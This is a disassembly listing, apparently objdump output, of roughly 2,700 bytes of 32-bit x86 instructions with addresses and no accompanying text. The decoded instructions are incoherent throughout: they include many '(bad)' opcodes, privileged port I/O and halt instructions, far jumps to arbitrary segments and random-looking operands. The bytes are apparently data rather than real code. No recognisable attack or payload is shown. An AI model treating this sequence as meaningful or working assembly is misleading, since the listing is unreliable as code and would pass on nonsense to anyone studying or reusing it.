  414447:	cld    
  414448:	test   eax,0xdf61eb10
  41444d:	scas   eax,DWORD PTR es:[edi]
  41444e:	lock mov dh,BYTE PTR [esi]
  414451:	cmp    esi,ecx
  414453:	adc    BYTE PTR [edx],ch
  414455:	jmp    0xf0f7:0x1e3de2c3
  41445c:	jl     0x414434
  41445e:	sbb    bl,BYTE PTR [ecx+0x9]
  414461:	dec    eax
  414462:	pop    eax
  414463:	es xor al,0x23
  414466:	imul   ecx,ebx,0x37fb985c
  41446c:	pop    esp
  41446d:	xor    BYTE PTR [ebx+0xa8a8335],dl
  414473:	mov    al,0xe8
  414475:	lods   al,BYTE PTR ds:[esi]
  414476:	call   0x7fd99db
  41447b:	aam    0xd7
  41447d:	pop    esi
  41447e:	mov    bl,0x3d
  414480:	(bad)  
  414482:	sbb    al,0x93
  414484:	push   es
  414485:	jge    0x414481
  414487:	mov    esp,0xb6f2b34c
  41448c:	test   BYTE PTR [eax-0x1],ch
  41448f:	dec    edi
  414490:	pop    edi
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0x24]
  414501:	and    eax,0xd5f0639f
  414506:	add    BYTE PTR [eax],al
  414508:	add    eax,0x4b000001
  41450d:	jle    0x414527
  41450f:	lock xor ecx,ebp
  414512:	inc    eax
  414513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414514:	(bad)  
  414515:	jmp    0xdb1a7841
  41451a:	test   DWORD PTR [edx],edx
  41451c:	lea    ebp,[esi]
  41451e:	int    0x41
  414520:	and    DWORD PTR [ecx-0x2d6d6502],edi
  414526:	pop    ebx
  414527:	out    dx,eax
  414528:	xlat   BYTE PTR ds:[ebx]
  414529:	pop    eax
  41452a:	or     eax,0xc121ae30
  41452f:	and    esi,eax
  414531:	imul   edx,DWORD PTR ds:0x72281018,0x937347a9
  41453b:	ret    
  41453c:	std    
  41453d:	cmp    al,0xc3
  41453f:	bound  edx,QWORD PTR [edx+0x64e910ba]
  414545:	(bad)  
  414547:	stos   DWORD PTR es:[edi],eax
  414548:	mov    ebx,DWORD PTR [ebp-0x5]
  41454b:	lds    ebp,FWORD PTR [edi]
  41454d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41454e:	(bad)
  414553:	mov    edi,0x2583e5f7
  414558:	repz sbb al,0xec
  41455b:	add    DWORD PTR [edi-0x3358748],0xffffffef
  414562:	in     al,dx
  414563:	inc    ecx
  414564:	retf   0x9a1a
  414567:	jb     0x414535
  414569:	fxtract 
  41456b:	dec    esi
  41456c:	les    eax,FWORD PTR [ecx-0x7bc9a7f7]
  414572:	push   esi
  414573:	fstp   DWORD PTR [ebx+0x68dbebe1]
  414579:	in     eax,0xea
  41457b:	jecxz  0x414544
  41457d:	test   bh,dl
  41457f:	popa   
  414580:	scas   al,BYTE PTR es:[edi]
  414581:	das    
  414582:	jno    0x414588
  414584:	sub    ebp,edx
  414586:	pop    ebp
  414587:	xor    BYTE PTR ds:0xa8af64ef,cl
  41458d:	push   esi
  41458e:	std    
  41458f:	or     al,0x57
  414591:	push   ebp
  414592:	(bad)  
  414593:	bound  edi,QWORD PTR [ebx-0x19d7f62]
  414599:	xchg   ebx,eax
  41459a:	iret   
  41459b:	pop    esi
  41459c:	jne    0x41455d
  41459e:	xor    BYTE PTR [ecx+0x61],ch
  4145a1:	mov    WORD PTR [edx],es
  4145a3:	test   BYTE PTR [ebp-0x3],dh
  4145a6:	je     0x4145ba
  4145a8:	add    ah,dl
  4145aa:	sahf   
  4145ab:	hlt    
  4145ac:	ins    DWORD PTR es:[edi],dx
  4145ad:	mov    cl,0x31
  4145af:	aam    0xf9
  4145b1:	xor    bh,BYTE PTR [eax+0x6be00e27]
  4145b7:	sti    
  4145b8:	scas   eax,DWORD PTR es:[edi]
  4145b9:	add    eax,0x6063d151
  4145be:	push   ebx
  4145c0:	bnd jg 0x4145ba
  4145c3:	xchg   ecx,eax
  4145c4:	push   ebp
  4145c5:	inc    eax
  4145c6:	mov    al,0xd1
  4145c8:	mov    ch,0x27
  4145ca:	and    DWORD PTR [ecx],0xffffffac
  4145cd:	mov    BYTE PTR [eax+0x2b],al
  4145d0:	inc    ecx
  4145d1:	fwait
  4145d2:	push   edi
  4145d3:	push   ss
  4145d4:	and    DWORD PTR [ebp-0x558fffe3],ecx
  4145da:	push   es
  4145db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145dc:	cmp    DWORD PTR [eax],ecx
  4145de:	jp     0x414593
  4145e0:	and    BYTE PTR [ecx],ah
  4145e2:	fnsave [ecx-0xe]
  4145e5:	xor    cl,BYTE PTR ds:0xf9760813
  4145eb:	fcmovu st,st(6)
  4145ed:	fisttp WORD PTR [esi-0x7deb2263]
  4145f3:	shl    ah,cl
  4145f5:	and    al,0x71
  4145f7:	(bad)  
  4145f8:	xchg   esp,eax
  4145f9:	fist   WORD PTR [esi]
  4145fb:	add    eax,0x8693490c
  414600:	xchg   ebp,eax
  414601:	or     al,cl
  414603:	mov    bl,BYTE PTR [ecx-0x7c514cab]
  414609:	xor    dh,BYTE PTR [esi-0x331fda5f]
  41460f:	add    BYTE PTR [esi+0x0],al
	...
  414672:	add    BYTE PTR [eax],al
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xdf
  414681:	push   esi
  414682:	call   0x500:0xd6f5d3
  414689:	add    DWORD PTR [eax],eax
  41468b:	add    BYTE PTR [edx-0x3ef8a50f],dl
  414691:	ins    DWORD PTR es:[edi],dx
  414692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414693:	je     0x414647
  414695:	retf   
  414696:	jmp    0x458a3744
  41469b:	shl    DWORD PTR [ebx-0x2481433d],1
  4146a1:	aas    
  4146a2:	fwait
  4146a3:	inc    esi
  4146a4:	pop    ebx
  4146a5:	sbb    DWORD PTR [ecx+0x65],esp
  4146a8:	jno    0x4146dd
  4146aa:	imul   esi,DWORD PTR [ebx],0x46c81e19
  4146b0:	sub    al,0x4f
  4146b2:	cmc    
  4146b3:	fistp  DWORD PTR [edx-0x2c]
  4146b6:	scas   al,BYTE PTR es:[edi]
  4146b7:	sub    DWORD PTR [edi],0xffffffe4
  4146ba:	into   
  4146bb:	loope  0x4146c6
  4146bd:	int    0x7b
  4146bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146c0:	loopne 0x4146b2
  4146c2:	dec    ecx
  4146c3:	test   eax,0xb0736f01
  4146c8:	daa    
  4146c9:	jo     0x4146cd
  4146cb:	sbb    DWORD PTR ds:0xd3795eef,ecx
  4146d1:	mov    ds:0x4e5d01fa,eax
  4146d6:	fist   DWORD PTR [ecx+0x1d]
  4146d9:	mov    al,ds:0x8c6085f4
  4146de:	cmp    edx,DWORD PTR [esi+0x62e814d4]
  4146e4:	sub    DWORD PTR [esi+0x1b],0xffffff97
  4146e8:	int3   
  4146e9:	inc    esp
  4146ea:	and    al,0x5
  4146ec:	xlat   BYTE PTR ds:[ebx]
  4146ed:	mov    ds:0xd087ae23,al
  4146f2:	loopne 0x414677
  4146f4:	stos   BYTE PTR es:[edi],al
  4146f5:	push   0xffffffbc
  4146f7:	sub    al,0xb7
  4146fa:	test   BYTE PTR [edx],cl
  4146fc:	xchg   esp,eax
  4146fd:	mov    ah,0x5e
  4146ff:	xor    edi,DWORD PTR [ecx]
  414701:	pop    edi
  414702:	push   eax
  414703:	or     al,0x95
  414705:	nop
  414706:	enter  0x2afc,0x94
  41470a:	sti    
  41470b:	outs   dx,DWORD PTR ds:[esi]
  41470c:	or     DWORD PTR [ebx+0x5f03ccf8],edx
  414712:	push   edi
  414713:	mov    edx,0x339f5be8
  414718:	leave  
  414719:	fcmovnbe st,st(0)
  41471b:	call   0xc050cc4
  414720:	retf   0x468d
  414723:	int    0x8f
  414725:	xchg   ebp,eax
  414726:	adc    DWORD PTR [edi+0x1408a1bb],ecx
  41472c:	scas   al,BYTE PTR es:[edi]
  41472d:	fild   QWORD PTR [eax+0xa7b613d]
  414733:	adc    ebp,DWORD PTR [ebx]
  414735:	add    ch,BYTE PTR [eax+eiz*2+0x5ae37f94]
  41473c:	mov    bl,0x7a
  41473e:	mov    ebp,0xc9e785ee
  414743:	in     eax,0x78
  414745:	std    
  414746:	push   eax
  414747:	aam    0x65
  414749:	aas    
  41474a:	call   0xc7d0075a
  41474f:	scas   eax,DWORD PTR es:[edi]
  414750:	mov    esp,0x687a5583
  414755:	pop    ebp
  414756:	cmp    al,ah
  414758:	pop    edi
  414759:	mov    edi,0xf6d9cf9c
  41475e:	mov    dl,BYTE PTR [esi]
  414760:	xlat   BYTE PTR ds:[ebx]
  414761:	ror    eax,cl
  414763:	or     al,BYTE PTR [ebx+eax*4-0x2a]
  414767:	push   ss
  414768:	out    dx,eax
  414769:	pushf  
  41476a:	inc    ebp
  41476b:	push   es
  41476c:	jp     0x414764
  41476e:	test   eax,0x50ac0d37
  414773:	jmp    0x4147a9
  414775:	aam    0xd6
  414777:	sbb    eax,0xda43fe75
  41477c:	in     al,0xaa
  41477e:	sub    eax,0x7a9e817a
  414783:	add    BYTE PTR [ebp*2-0x47a5e27e],al
  41478a:	outs   dx,DWORD PTR ds:[esi]
  41478b:	fwait
  41478c:	cmp    edx,DWORD PTR ds:0xeef1e
	...
  4147f2:	add    BYTE PTR [eax],al
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x9069f4c0
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0x8a000001
  41480d:	mov    dh,bh
  41480f:	add    al,BYTE PTR [edx+0x53cb2a35]
  414815:	mov    bl,0x5b
  414817:	(bad)  
  414819:	sahf   
  41481a:	pop    edx
  41481b:	pusha  
  41481c:	sub    al,0x9f
  41481e:	mov    cs:0x54c13410,al
  414824:	pop    edx
  414825:	dec    esp
  414826:	push   ds
  414827:	cmp    cl,BYTE PTR [edx+0x60fca552]
  41482d:	mov    ebp,0x5c3e9796
  414832:	jmp    0xb38ef762
  414837:	lds    eax,FWORD PTR [esi+0xf0f75b7]
  41483d:	pop    ecx
  41483e:	test   DWORD PTR [ebp-0x77],ebp
  414841:	loop   0x414826
  414843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414844:	ins    DWORD PTR es:[edi],dx
  414845:	sbb    ah,al
  414847:	inc    DWORD PTR [edi-0x17]
  41484a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41484b:	mov    ebx,0x94dba3b6
  414850:	sub    al,0x19
  414852:	dec    bl
  414854:	shl    DWORD PTR [eax],0x16
  414857:	pusha  
  414858:	je     0x41481b
  41485a:	push   eax
  41485b:	push   es
  41485c:	mov    dh,0xf7
  41485e:	or     al,0xaf
  414860:	jg     0x414817
  414862:	mov    WORD PTR [edx+edi*8+0x206312d2],es
  414869:	ror    BYTE PTR [ecx+0xe],1
  41486c:	sbb    ebp,edi
  41486e:	lea    ebp,[ecx+0x4aaae765]
  414874:	add    al,0x89
  414876:	sti    
  414877:	mov    DWORD PTR [edi-0x45a01282],ecx
  41487d:	test   al,0x24
  41487f:	push   ss
  414880:	(bad)  
  414881:	shr    dl,cl
  414883:	pop    ds
  414884:	aaa    
  414885:	pop    esp
  414886:	adc    edi,esp
  414888:	adc    al,0x5
  41488a:	jle    0x4148d2
  41488c:	(bad)  
  41488d:	jo     0x414893
  41488f:	cmp    ch,bh
  414891:	add    ch,BYTE PTR [esp+eiz*4]
  414894:	jmp    0x414857
  414896:	rol    BYTE PTR [edi+0x7c],1
  414899:	aad    0x53
  41489b:	sbb    BYTE PTR [ebp-0x1059cda0],dl
  4148a1:	mov    WORD PTR ds:0x3ff2e274,gs
  4148a7:	ret    0x45a5
  4148aa:	jb     0x41492b
  4148ac:	in     al,0x9
  4148ae:	inc    esp
  4148af:	out    0xb9,al
  4148b1:	gs jbe 0x414839
  4148b4:	inc    edx
  4148b5:	push   cs
  4148b6:	aaa    
  4148b7:	cli    
  4148b8:	pop    edi
  4148b9:	les    edx,FWORD PTR [esi+0x4b6f4deb]
  4148bf:	sub    DWORD PTR [esi+0x60520ee5],0x2b316b01
  4148c9:	jp     0x414945
  4148cb:	call   DWORD PTR [edx-0x44ee5d99]
  4148d1:	dec    ecx
  4148d2:	jle    0x414929
  4148d4:	inc    ebx
  4148d5:	fwait
  4148d6:	add    eax,DWORD PTR [ecx-0x726dd906]
  4148dc:	es in  al,dx
  4148de:	and    DWORD PTR [eax+0x0],0x6e563621
  4148e5:	mov    ebp,0x47d1cf7f
  4148ea:	add    eax,0x2dd10a26
  4148ef:	push   ebp
  4148f0:	repz pop ebx
  4148f2:	pusha  
  4148f3:	das    
  4148f4:	xor    DWORD PTR [edi+0x3da9bac1],edi
  4148fa:	fcomp  QWORD PTR [ecx]
  4148fc:	push   ss
  4148fd:	adc    eax,DWORD PTR [edx]
  4148ff:	push   eax
  414900:	mov    BYTE PTR ds:0x2ae5fd18,ah
  414906:	mov    dl,BYTE PTR [ecx+0x47]
  414909:	xor    al,BYTE PTR [ebp-0x21]
  41490c:	loope  0x414960
  41490e:	(bad)  
  41490f:	stc    
  414910:	and    eax,DWORD PTR [eax]
	...
  414972:	add    BYTE PTR [eax],al
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	and    DWORD PTR [ebp+0x5d],0xd8ffa5
  414987:	add    BYTE PTR ds:0xbd000001,al
  41498d:	cmp    al,0xf5
  41498f:	jb     0x41496c
  414991:	mov    ch,0xe7
  414993:	mov    dh,BYTE PTR [ebx]
  414995:	out    0x26,eax
  414997:	push   ecx
  414998:	fistp  WORD PTR [edi-0x42]
  41499b:	inc    esp
  41499c:	cmp    cl,BYTE PTR [eax+0x677f85e3]
  4149a2:	pop    ebx
  4149a3:	mov    al,ds:0x4984e8a4
  4149a8:	imul   esp,DWORD PTR [eax-0x5f9639a8],0xb60daac1
  4149b2:	(bad)  
  4149b3:	das    
  4149b4:	or     BYTE PTR [ebx+0x4f8a6962],ah
  4149ba:	sbb    al,0x4e
  4149bc:	cmp    bh,dh
  4149be:	pushf  
  4149bf:	pop    edi
  4149c0:	das    
  4149c1:	add    al,0xd7
  4149c4:	mov    ebx,0x84fdfbe
  4149c9:	jbe    0x414a0b
  4149cb:	mov    fs,WORD PTR [ebx]
  4149cd:	push   ss
  4149ce:	inc    edi
  4149cf:	std    
  4149d0:	jle    0x414a23
  4149d2:	inc    eax
  4149d3:	xchg   edi,eax
  4149d4:	sub    dl,cl
  4149d6:	mov    ch,cl
  4149d8:	(bad)  
  4149d9:	hlt    
  4149da:	pop    esi
  4149db:	les    edi,FWORD PTR [edi-0x75]
  4149de:	sub    DWORD PTR [ecx],0xffffff8b
  4149e1:	add    bl,0x5
  4149e4:	lea    ecx,[edi+edx*2]
  4149e7:	inc    esp
  4149e8:	(bad)  [esp+ebx*4]
  4149eb:	push   0xffffff89
  4149ed:	mov    BYTE PTR [ecx],bl
  4149ef:	fidivr WORD PTR [esi]
  4149f1:	test   BYTE PTR [edi+esi*4+0x22],bl
  4149f5:	inc    ecx
  4149f6:	ss retf 
  4149f8:	repz test eax,0x1bbdffeb
  4149fe:	inc    edi
  4149ff:	hlt    
  414a00:	(bad)  
  414a01:	ds or  al,0x6c
  414a04:	push   ebp
  414a05:	call   0x63fe32a2
  414a0a:	ror    BYTE PTR [edx-0x1c74557f],1
  414a10:	cmp    eax,0x7352c73e
  414a15:	cmp    ah,BYTE PTR [edi+ecx*2]
  414a18:	fstp   DWORD PTR [ecx+0x2a657d55]
  414a1e:	pop    ebp
  414a1f:	or     eax,0x95299c98
  414a24:	aad    0x16
  414a26:	dec    ebx
  414a27:	xchg   ebp,eax
  414a28:	or     edi,DWORD PTR [edi+0x558dd513]
  414a2e:	or     esi,ecx
  414a30:	(bad)  
  414a31:	enter  0x38c1,0x7c
  414a35:	jle    0x4149e4
  414a37:	dec    edx
  414a38:	(bad)  
  414a3a:	imul   esp,DWORD PTR [ebp-0x2c142bd4],0xffffffef
  414a41:	loope  0x414aaf
  414a43:	int    0xdf
  414a45:	sbb    DWORD PTR [eax+0x69],edx
  414a48:	stc    
  414a49:	fs jg  0x414ac0
  414a4c:	adc    eax,0x938bcdfd
  414a52:	pusha  
  414a53:	xchg   DWORD PTR [ebp+0x7e],eax
  414a56:	into   
  414a57:	mov    cl,0xaa
  414a59:	shl    DWORD PTR [eax],cl
  414a5b:	add    eax,0xea967537
  414a60:	xor    al,BYTE PTR [eax+0x3d]
  414a63:	push   edx
  414a64:	inc    esp
  414a65:	out    0x59,al
  414a67:	out    dx,eax
  414a68:	and    dh,BYTE PTR [edx-0x26fadc11]
  414a6e:	div    BYTE PTR [esi]
  414a70:	fcomp  DWORD PTR [edi-0x1]
  414a73:	inc    esi
  414a74:	push   0xffffffe7
  414a76:	add    WORD PTR [ebp-0x2c],sp
  414a7a:	leave  
  414a7b:	retf   
  414a7c:	loope  0x414aa9
  414a7e:	cmp    BYTE PTR [edx-0x35],cl
  414a81:	dec    ebp
  414a82:	outs   dx,DWORD PTR ds:[esi]
  414a83:	cmp    ebp,eax
  414a85:	adc    BYTE PTR [eax-0x697ca6b6],ah
  414a8b:	inc    esp
  414a8c:	rol    DWORD PTR [si],cl
  414a8f:	push   ebx
  414a90:	jle    0x414a92
	...
  414af2:	add    BYTE PTR [eax],al
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx-0x33fc9c27]
  414b02:	rcr    eax,cl
  414b04:	add    al,0xda
  414b06:	add    BYTE PTR [eax],al
  414b08:	add    eax,0x16000001
  414b0d:	pop    ds
  414b0e:	pusha  
  414b0f:	test   DWORD PTR [edi],edi
  414b11:	out    0xc7,al
  414b13:	sbb    esp,eax
  414b15:	fisubr DWORD PTR [edx]
  414b17:	xchg   ebp,eax
  414b18:	pop    esp
  414b19:	mov    ds:0xc2418b16,al
  414b1e:	das    
  414b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b20:	fcmovnu st,st(7)
  414b22:	jl     0x414b38
  414b24:	pop    edi
  414b25:	mov    al,ds:0xbf452be2
  414b2a:	and    BYTE PTR [ebp+0x75],bh
  414b2d:	cmp    ebp,ebp
  414b2f:	call   DWORD PTR [ebx-0x43]
  414b32:	sbb    al,0xe3
  414b34:	arpl   WORD PTR [edi],sp
  414b36:	mov    BYTE PTR [ecx],0xba
  414b39:	xchg   ebp,eax
  414b3a:	inc    esi
  414b3b:	mov    esp,0xf0529720
  414b40:	imul   ebp,DWORD PTR [eax],0xc48b47ff
  414b46:	jo     0x414b1f
  414b48:	scas   al,BYTE PTR es:[edi]
  414b49:	nop
  414b4a:	sub    BYTE PTR ds:0xef0ab00c,al
  414b50:	cmp    eax,0xdf69e88b
  414b55:	pop    DWORD PTR [ebx+esi*2-0x7b]
  414b59:	cmp    eax,0x823e773
  414b5e:	pop    ebx
  414b5f:	(bad)  
  414b60:	cmp    ah,BYTE PTR ss:[edi-0xc]
  414b64:	xchg   ebp,eax
  414b65:	daa    
  414b66:	inc    edi
  414b67:	mov    ecx,0xa99b04c1
  414b6c:	mov    ch,0xaa
  414b6e:	fiadd  DWORD PTR [ecx+0x79]
  414b71:	add    eax,DWORD PTR [esi-0xd]
  414b74:	outs   dx,DWORD PTR ds:[esi]
  414b75:	retf   0x8ba5
  414b78:	stc    
  414b79:	das    
  414b7a:	push   0x5fce1b1d
  414b7f:	lahf   
  414b80:	mov    WORD PTR [edx],fs
  414b82:	jp     0x414b77
  414b84:	cmp    esp,DWORD PTR [ecx]
  414b86:	mov    al,0x2f
  414b88:	(bad)  
  414b89:	repz sub eax,0xd1968e90
  414b8f:	in     al,dx
  414b90:	inc    esi
  414b91:	or     DWORD PTR ds:0x9f8c1600,edi
  414b97:	rcl    ebp,1
  414b99:	mov    dh,0x61
  414b9b:	test   eax,0x855eef10
  414ba0:	cmp    bl,BYTE PTR ds:[edx]
  414ba3:	add    BYTE PTR [esi],dh
  414ba5:	loopne 0x414bbd
  414ba7:	test   eax,0x953ca14d
  414bac:	cs loope 0x414bd3
  414baf:	pop    ecx
  414bb0:	lea    ebx,[esi-0x3dd65361]
  414bb6:	sti    
  414bb7:	test   DWORD PTR [edi+eiz*2+0x72],edi
  414bbb:	in     al,0xb7
  414bbd:	or     eax,0xf501e594
  414bc2:	cmc    
  414bc3:	int3   
  414bc4:	mov    es,esp
  414bc6:	mov    eax,ds:0x3df26a68
  414bcb:	jge    0x414b50
  414bcd:	(bad)  
  414bce:	push   edi
  414bcf:	inc    ebx
  414bd0:	pop    ss
  414bd1:	cmp    al,0x81
  414bd3:	inc    esi
  414bd4:	sub    al,bh
  414bd6:	mov    al,0x9b
  414bd8:	aad    0x92
  414bda:	fs hlt 
  414bdc:	mov    dh,0xfb
  414bde:	std    
  414bdf:	sub    bl,bh
  414be1:	sti    
  414be2:	mov    dh,0x3d
  414be4:	lods   al,BYTE PTR ds:[esi]
  414be5:	in     al,0xe7
  414be7:	rcl    BYTE PTR [ebx-0x4e],cl
  414bea:	arpl   dx,si
  414bec:	call   0xcb4e1dda
  414bf1:	out    dx,al
  414bf2:	mov    ecx,ds
  414bf4:	jl     0x414c20
  414bf6:	sub    bl,cl
  414bf8:	mov    al,0xe8
  414bfa:	xchg   ebp,eax
  414bfb:	adc    BYTE PTR [esi-0x3a66f93c],dh
  414c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c02:	dec    esi
  414c03:	test   BYTE PTR [edi-0x6ff1e92],dh
  414c09:	aam    0xae
  414c0b:	mov    esp,DWORD PTR [ecx+ecx*1]
  414c0e:	mov    ebx,0x8f59
	...
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ecx,DWORD PTR cs:[edi+0x91f32b6]
  414c85:	fild   DWORD PTR [eax]
  414c87:	add    BYTE PTR ds:0x71000001,al
  414c8d:	outs   dx,DWORD PTR ds:[esi]
  414c8e:	push   edi
  414c8f:	imul   ebx,edi,0xffffffb1
  414c92:	mov    al,0x1d
  414c94:	(bad)  
  414c95:	in     eax,dx
  414c96:	mov    edi,0x58856e56
  414c9b:	mov    cl,BYTE PTR [ecx+edi*2+0x1e4f5c69]
  414ca2:	adc    bl,BYTE PTR [esi+0x21]
  414ca5:	add    BYTE PTR [ecx+0x5d743b38],ch
  414cab:	xor    al,0x1a
  414cad:	mov    eax,ds:0xd8d5c5d9
  414cb2:	idiv   ah
  414cb4:	int3   
  414cb5:	dec    ecx
  414cb6:	xor    DWORD PTR [eax-0x3fc8b2ed],ebp
  414cbc:	pop    ebx
  414cbd:	pop    DWORD PTR [edx+0x20]
  414cc0:	jmp    0x414d25
  414cc2:	mov    DWORD PTR [ecx],ecx
  414cc4:	push   0x5349e18c
  414cc9:	test   DWORD PTR [edx],eax
  414ccb:	ins    BYTE PTR es:[edi],dx
  414ccc:	cmp    al,0xb2
  414cce:	std    
  414ccf:	lahf   
  414cd0:	icebp  
  414cd1:	sar    BYTE PTR [ebx-0x14],cl
  414cd4:	push   edi
  414cd5:	inc    ebx
  414cd6:	idiv   DWORD PTR [eax]
  414cd8:	jp     0x414d1a
  414cda:	lock loop 0x414d0a
  414cdd:	pop    ebp
  414cde:	inc    esp
  414cdf:	test   BYTE PTR [eax],dl
  414ce1:	pop    esp
  414ce2:	xor    esi,ecx
  414ce4:	out    0x1f,al
  414ce6:	sbb    eax,0x72fd6aad
  414ceb:	pop    edi
  414cec:	jecxz  0x414d02
  414cee:	and    BYTE PTR ds:0xc0df683c,dl
  414cf4:	add    eax,0xc4d08c14
  414cf9:	inc    ecx
  414cfa:	mov    al,0xbb
  414cfc:	dec    ecx
  414cfd:	punpcklbw mm6,DWORD PTR [ebx+0x214dc448]
  414d04:	(bad)  
  414d05:	(bad)  
  414d06:	push   eax
  414d07:	mov    WORD PTR [ecx-0xb7fbc36],cs
  414d0d:	sub    cl,BYTE PTR [esi]
  414d0f:	sbb    DWORD PTR [ecx+eiz*2],0xad0d8c00
  414d16:	mov    eax,0x59ab6a92
  414d1b:	push   ebx
  414d1c:	cmp    BYTE PTR [ecx],0x7e
  414d1f:	test   al,0xd8
  414d21:	xor    eax,0x8b35e77e
  414d26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d27:	stos   DWORD PTR es:[edi],eax
  414d28:	les    eax,FWORD PTR [edx-0x51]
  414d2b:	mov    ds:0x3caa64c1,eax
  414d30:	push   0xd
  414d32:	loopne 0x414cd1
  414d34:	xchg   edx,eax
  414d35:	or     DWORD PTR [ecx+0x77c14ef],edx
  414d3b:	lock lea ebp,[esi+0x18]
  414d3f:	(bad)  
  414d40:	lods   al,BYTE PTR ds:[esi]
  414d41:	inc    ebp
  414d42:	add    al,0x83
  414d44:	sbb    DWORD PTR [edx+0x24],ecx
  414d47:	repnz mov al,0x3c
  414d4a:	adc    edx,DWORD PTR [edx]
  414d4c:	or     eax,0xdd487cc9
  414d51:	idiv   BYTE PTR [ebp+0x35]
  414d54:	add    DWORD PTR [ebp+0x39a7e95e],esp
  414d5a:	xor    ebp,DWORD PTR [ebx+0x31]
  414d5d:	mov    ebp,DWORD PTR [ecx+0x572e02ba]
  414d63:	out    0xc5,eax
  414d65:	inc    esp
  414d66:	adc    eax,0x84e9de81
  414d6b:	xchg   ebx,eax
  414d6c:	out    0x12,eax
  414d6e:	dec    ecx
  414d6f:	push   eax
  414d70:	js     0x414d64
  414d72:	inc    ebx
  414d73:	ret    0x8bc0
  414d76:	pop    ebp
  414d77:	pop    esi
  414d78:	pusha  
  414d79:	mov    esp,0x889be3e0
  414d7e:	jmp    0x6caa:0xad0bcba3
  414d85:	xor    ecx,DWORD PTR [edx+0x32cd0104]
  414d8b:	push   esi
  414d8c:	xlat   BYTE PTR ds:[ebx]
  414d8d:	pusha  
  414d8e:	xchg   ecx,eax
  414d8f:	inc    edx
  414d90:	fadd   DWORD PTR [eax]
	...
  414df2:	add    BYTE PTR [eax],al
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x84dbc9e2
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0x79000001,al
  414e0d:	sbb    ebx,edx
  414e0f:	push   cs
  414e10:	mov    ebp,0x6ca4ed2d
  414e15:	add    DWORD PTR ds:0x12bce34d,0xfbe87393
  414e1f:	push   edx
  414e20:	and    eax,0x226ce9ab
  414e25:	clc    
  414e26:	or     dh,BYTE PTR [ebx+0x65]
  414e29:	push   ebp
  414e2a:	jg     0x414e88
  414e2c:	in     al,0x7c
  414e2e:	mov    eax,0x1bc07474
  414e33:	shl    esp,1
  414e35:	add    al,0x5b
  414e37:	and    al,0xe1
  414e39:	popf   
  414e3a:	sub    DWORD PTR [ebx+0x5b],ecx
  414e3d:	je     0x414ddb
  414e3f:	xor    eax,0xaad1fd17
  414e44:	out    dx,al
  414e45:	stos   DWORD PTR es:[edi],eax
  414e46:	pop    edx
  414e47:	push   ds
  414e48:	mov    ch,0xc2
  414e4a:	mov    ebp,eax
  414e4c:	xor    al,0x7d
  414e4e:	add    al,0xdb
  414e50:	jno    0x414ec3
  414e52:	aam    0x14
  414e54:	mov    ch,0x76
  414e56:	loope  0x414df0
  414e58:	pusha  
  414e59:	outs   dx,DWORD PTR ds:[esi]
  414e5a:	dec    ecx
  414e5b:	mov    ds:0xf5f23f02,al
  414e60:	sub    ah,BYTE PTR [ecx-0x2ca4b8d3]
  414e66:	sub    DWORD PTR [ebx+0x5ef60480],esp
  414e6c:	xor    ebx,DWORD PTR [ebp+0x7a]
  414e6f:	in     eax,0xbd
  414e71:	xor    al,0xa6
  414e73:	dec    ecx
  414e74:	mov    ah,0x3d
  414e76:	push   eax
  414e77:	adc    cl,BYTE PTR [ebx]
  414e79:	or     ebp,ebp
  414e7b:	leave  
  414e7c:	test   BYTE PTR [edi],0xa7
  414e7f:	mov    dh,0xf5
  414e81:	pop    es
  414e82:	test   DWORD PTR [ebp+0x5bef0d49],edx
  414e88:	hlt    
  414e89:	aad    0x6e
  414e8b:	cmp    eax,0x4d9809c7
  414e90:	sbb    bh,BYTE PTR [ecx]
  414e92:	das    
  414e93:	fisubr WORD PTR [esi]
  414e95:	cmp    bl,BYTE PTR [ebx-0x27]
  414e98:	sahf   
  414e99:	mov    ebx,DWORD PTR [ebx]
  414e9b:	push   edx
  414e9c:	(bad)
  414e9f:	xor    ebx,DWORD PTR [ebx]
  414ea1:	mov    ds:0x30443b28,eax
  414ea6:	daa    
  414ea7:	adc    bh,BYTE PTR [ebx]
